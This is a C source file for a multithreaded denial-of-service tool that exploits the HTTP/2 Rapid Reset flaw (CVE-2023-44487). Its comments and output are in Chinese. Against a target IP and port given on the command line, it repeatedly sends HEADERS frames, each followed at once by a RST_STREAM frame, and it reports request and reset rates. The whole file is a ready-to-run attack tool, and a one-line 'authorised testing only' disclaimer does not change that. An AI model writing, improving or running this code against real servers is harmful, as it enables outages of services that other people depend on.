/*
 * HTTP/2 Rapid Reset Attack (CVE-2023-44487)
 * 最新2024-2025年攻击技术
 * 可达到数百万RPS攻击效果
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <time.h>
#include <signal.h>

#define MAX_THREADS 1000
#define HTTP2_PREFACE "PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n"
#define HTTP2_SETTINGS "\x00\x00\x00\x04\x00\x00\x00\x00\x00"
#define HTTP2_HEADERS_FRAME_TYPE 0x01
#define HTTP2_RST_STREAM_FRAME_TYPE 0x03

struct attack_config {
    char target_ip[256];
    int target_port;
    int duration;
    int threads;
    volatile int running;
    volatile long total_requests;
    volatile long total_resets;
};

struct thread_data {
    struct attack_config *config;
    int thread_id;
};

// HTTP/2帧结构
struct http2_frame {
    unsigned char length[3];    // 24位长度
    unsigned char type;         // 8位类型
    unsigned char flags;        // 8位标志
    unsigned char stream_id[4]; // 31位流ID + 1位保留
};

// 创建HTTP/2 HEADERS帧
void create_headers_frame(char *buffer, int stream_id) {
    struct http2_frame *frame = (struct http2_frame *)buffer;
    
    // 设置帧长度 (简单的GET请求头)
    frame->length[0] = 0x00;
    frame->length[1] = 0x00;
    frame->length[2] = 0x29; // 41字节
    
    frame->type = HTTP2_HEADERS_FRAME_TYPE;
    frame->flags = 0x05; // END_HEADERS | END_STREAM
    
    // 设置流ID (网络字节序)
    frame->stream_id[0] = (stream_id >> 24) & 0x7F; // 清除保留位
    frame->stream_id[1] = (stream_id >> 16) & 0xFF;
    frame->stream_id[2] = (stream_id >> 8) & 0xFF;
    frame->stream_id[3] = stream_id & 0xFF;
    
    // 添加简单的HPACK编码头部
    char *payload = buffer + sizeof(struct http2_frame);
    strcpy(payload, "\x82\x86\x84\x41\x0f\x77\x77\x77\x2e\x65\x78\x61\x6d\x70\x6c\x65\x2e\x63\x6f\x6d\x83\x86\x44\x0f\x2f\x69\x6e\x64\x65\x78\x2e\x68\x74\x6d\x6c");
}

// 创建HTTP/2 RST_STREAM帧
void create_rst_stream_frame(char *buffer, int stream_id) {
    struct http2_frame *frame = (struct http2_frame *)buffer;
    
    // RST_STREAM帧长度固定为4字节
    frame->length[0] = 0x00;
    frame->length[1] = 0x00;
    frame->length[2] = 0x04;
    
    frame->type = HTTP2_RST_STREAM_FRAME_TYPE;
    frame->flags = 0x00;
    
    // 设置流ID
    frame->stream_id[0] = (stream_id >> 24) & 0x7F;
    frame->stream_id[1] = (stream_id >> 16) & 0xFF;
    frame->stream_id[2] = (stream_id >> 8) & 0xFF;
    frame->stream_id[3] = stream_id & 0xFF;
    
    // 错误码 (CANCEL = 0x08)
    char *payload = buffer + sizeof(struct http2_frame);
    payload[0] = 0x00;
    payload[1] = 0x00;
    payload[2] = 0x00;
    payload[3] = 0x08;
}

void *attack_thread(void *arg) {
    struct thread_data *data = (struct thread_data *)arg;
    struct attack_config *config = data->config;
    int sock;
    struct sockaddr_in server_addr;
    char buffer[1024];
    int stream_id = data->thread_id * 10000; // 每个线程使用不同的流ID范围
    
    printf("[线程 %d] 开始HTTP/2 Rapid Reset攻击\n", data->thread_id);
    
    while (config->running) {
        // 创建socket连接
        sock = socket(AF_INET, SOCK_STREAM, 0);
        if (sock < 0) {
            continue;
        }
        
        // 设置服务器地址
        memset(&server_addr, 0, sizeof(server_addr));
        server_addr.sin_family = AF_INET;
        server_addr.sin_port = htons(config->target_port);
        inet_pton(AF_INET, config->target_ip, &server_addr.sin_addr);
        
        // 连接到目标服务器
        if (connect(sock, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
            close(sock);
            usleep(1000); // 1ms延迟
            continue;
        }
        
        // 发送HTTP/2连接前言
        send(sock, HTTP2_PREFACE, strlen(HTTP2_PREFACE), 0);
        send(sock, HTTP2_SETTINGS, 9, 0);
        
        // 快速创建和重置流
        for (int i = 0; i < 1000 && config->running; i++) {
            stream_id += 2; // HTTP/2流ID必须是奇数
            
            // 创建HEADERS帧
            create_headers_frame(buffer, stream_id);
            if (send(sock, buffer, sizeof(struct http2_frame) + 41, 0) > 0) {
                config->total_requests++;
            }
            
            // 立即发送RST_STREAM帧
            create_rst_stream_frame(buffer, stream_id);
            if (send(sock, buffer, sizeof(struct http2_frame) + 4, 0) > 0) {
                config->total_resets++;
            }
            
            // 微小延迟以避免过快
            usleep(10); // 10微秒
        }
        
        close(sock);
    }
    
    printf("[线程 %d] 攻击结束\n", data->thread_id);
    return NULL;
}

void print_stats(struct attack_config *config) {
    time_t start_time = time(NULL);
    
    while (config->running) {
        sleep(5);
        time_t elapsed = time(NULL) - start_time;
        
        printf("\n=== HTTP/2 Rapid Reset 攻击统计 ===\n");
        printf("目标: %s:%d\n", config->target_ip, config->target_port);
        printf("运行时间: %ld秒\n", elapsed);
        printf("总请求数: %ld\n", config->total_requests);
        printf("总重置数: %ld\n", config->total_resets);
        printf("平均RPS: %ld\n", elapsed > 0 ? config->total_requests / elapsed : 0);
        printf("活跃线程: %d\n", config->threads);
        printf("================================\n");
    }
}

void signal_handler(int sig) {
    printf("\n收到停止信号，正在清理...\n");
    exit(0);
}

int main(int argc, char *argv[]) {
    if (argc != 5) {
        printf("HTTP/2 Rapid Reset 攻击工具 (CVE-2023-44487)\n");
        printf("使用方法: %s <目标IP> <端口> <线程数> <持续时间>\n", argv[0]);
        printf("示例: %s 192.168.1.100 443 100 300\n", argv[0]);
        return 1;
    }
    
    struct attack_config config;
    strcpy(config.target_ip, argv[1]);
    config.target_port = atoi(argv[2]);
    config.threads = atoi(argv[3]);
    config.duration = atoi(argv[4]);
    config.running = 1;
    config.total_requests = 0;
    config.total_resets = 0;
    
    if (config.threads > MAX_THREADS) {
        config.threads = MAX_THREADS;
    }
    
    printf("🚀 启动HTTP/2 Rapid Reset攻击\n");
    printf("目标: %s:%d\n", config.target_ip, config.target_port);
    printf("线程数: %d\n", config.threads);
    printf("持续时间: %d秒\n", config.duration);
    printf("⚠️  这是CVE-2023-44487漏洞利用，仅用于授权测试！\n\n");
    
    // 设置信号处理
    signal(SIGINT, signal_handler);
    signal(SIGTERM, signal_handler);
    
    // 创建攻击线程
    pthread_t threads[MAX_THREADS];
    struct thread_data thread_data[MAX_THREADS];
    
    for (int i = 0; i < config.threads; i++) {
        thread_data[i].config = &config;
        thread_data[i].thread_id = i;
        pthread_create(&threads[i], NULL, attack_thread, &thread_data[i]);
        usleep(1000); // 1ms间隔启动线程
    }
    
    // 启动统计线程
    pthread_t stats_thread;
    pthread_create(&stats_thread, NULL, (void *)print_stats, &config);
    
    // 等待指定时间
    sleep(config.duration);
    
    // 停止攻击
    config.running = 0;
    printf("\n⏰ 攻击时间结束，正在停止所有线程...\n");
    
    // 等待所有线程结束
    for (int i = 0; i < config.threads; i++) {
        pthread_join(threads[i], NULL);
    }
    
    printf("\n✅ HTTP/2 Rapid Reset攻击完成\n");
    printf("最终统计:\n");
    printf("- 总请求数: %ld\n", config.total_requests);
    printf("- 总重置数: %ld\n", config.total_resets);
    printf("- 平均RPS: %ld\n", config.duration > 0 ? config.total_requests / config.duration : 0);
    
    return 0;
}
